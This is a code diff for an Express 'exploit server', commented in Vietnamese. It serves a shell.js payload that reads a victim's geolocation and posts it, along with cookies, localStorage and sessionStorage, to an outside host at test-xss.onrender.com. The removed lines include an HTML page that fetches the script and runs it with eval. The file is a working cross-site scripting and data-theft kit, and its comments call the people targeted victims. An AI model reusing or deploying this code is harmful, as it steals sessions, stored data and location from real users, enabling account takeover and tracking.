@@ -125,48 +125,31 @@ const express = require("express");
 const app = express();
 const PORT = 3006;
 
-// Middleware bắt và log dữ liệu từ POST
+// Middleware log request
 app.use(express.json());
 app.use((req, res, next) => {
-  const time = new Date().toLocaleTimeString();
-  console.log(`[${time}] ${req.method} request tới: ${req.url}`);
-  if (req.method === "POST") {
-    console.log("📩 Nhận dữ liệu từ nạn nhân:", req.body);
-  }
+  console.log(`[${new Date().toLocaleTimeString()}] ${req.method} request tới: ${req.url}`);
+  if (req.method === "POST") console.log("📩 Nhận dữ liệu:", req.body);
   next();
 });
 
-// Route mặc định
-app.get("/", (req, res) => {
-  res.send("🚀 Hello, đây là server exploit!");
+// Cấu hình CORS đầy đủ
+app.use((req, res, next) => {
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
+  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
+  if (req.method === "OPTIONS") return res.sendStatus(200);
+  next();
 });
 
-// Route tạo file HTML chứa payload auto-fetch shell.js
-app.get("/payload.html", (req, res) => {
-  const htmlPayload = `
-    <!DOCTYPE html>
-    <html>
-      <body>
-        <h1>Welcome to the safe site 😈</h1>
-        <script>
-          fetch("http://localhost:3006/shell.js")
-            .then(res => res.text())
-            .then(shell => eval(shell));
-        </script>
-      </body>
-    </html>
-  `;
+// Route trang chính
+app.get("/", (req, res) => res.send("🚀 Hello, đây là server exploit!"));
 
-  res.setHeader("Content-Type", "text/html");
-  res.send(htmlPayload);
-});
-
-// Route shell.js — Thực thi RCE từ client
+// Route shell.js — Gửi payload
 app.get("/shell.js", (req, res) => {
   const shellJS = `
     alert("Bạn đã bị hack!");
 
-    // Lấy vị trí địa lý của nạn nhân
     navigator.geolocation.getCurrentPosition((position) => {
       fetch("https://test-xss.onrender.com/location", {
         method: "POST",
@@ -178,7 +161,6 @@ app.get("/shell.js", (req, res) => {
       });
     });
 
-    // Đính kèm lấy cookie + localStorage + sessionStorage
     fetch("https://test-xss.onrender.com/stolen-data", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -190,19 +172,12 @@ app.get("/shell.js", (req, res) => {
     });
   `;
 
-  // Set headers chuẩn chỉnh
   res.setHeader("Content-Type", "application/javascript");
-  res.setHeader("Access-Control-Allow-Origin", "*");
-  res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
-  res.setHeader("Pragma", "no-cache");
-  res.setHeader("Expires", "0");
-
   console.log("📡 Gửi shell.js cho nạn nhân!");
   res.send(shellJS);
 });
 
-
-// Route nhận dữ liệu vị trí của nạn nhân
+// Route nhận vị trí nạn nhân
 app.post("/location", (req, res) => {
   console.log("📍 Vị trí nạn nhân:", req.body);
   res.send("✅ Đã nhận vị trí!");
@@ -216,9 +191,10 @@ app.post("/stolen-data", (req, res) => {
 
 // Khởi chạy server
 app.listen(PORT, () => {
-  console.log(`Server exploit đang chạy tại: http://localhost:${PORT}`);
-  console.log(`⚡ Truy cập payload tại: http://localhost:${PORT}/payload.html`);
+  console.log(`⚡ Server exploit đang chạy tại: http://localhost:${PORT}`);
+  console.log(`🔗 Truy cập payload tại: http://localhost:${PORT}/payload.html`);
 });
+
 
 
 
